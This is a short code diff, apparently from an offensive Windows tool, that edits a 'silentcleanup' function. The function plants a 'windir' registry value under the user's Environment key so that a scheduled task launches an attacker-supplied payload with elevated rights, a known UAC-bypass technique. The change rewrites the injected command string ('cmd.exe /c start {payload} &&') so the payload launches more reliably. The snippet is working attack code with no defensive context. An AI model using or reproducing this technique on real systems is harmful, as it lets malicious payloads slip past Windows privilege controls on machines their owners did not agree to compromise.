@@ -27,7 +27,7 @@ def silentcleanup(payload):
 	if payloads().exe(payload):
 		path = "Environment"
 
-		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe & {payload}".format(payload=os.path.join(payload)), create=True):
+		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe /c start {payload} &&".format(payload=os.path.join(payload)), create=True):
 			print_success("Successfully created WINDIR key containing payload ({payload})".format(payload=os.path.join(payload)))
 		else:
 			print_error("Unable to create registry keys")
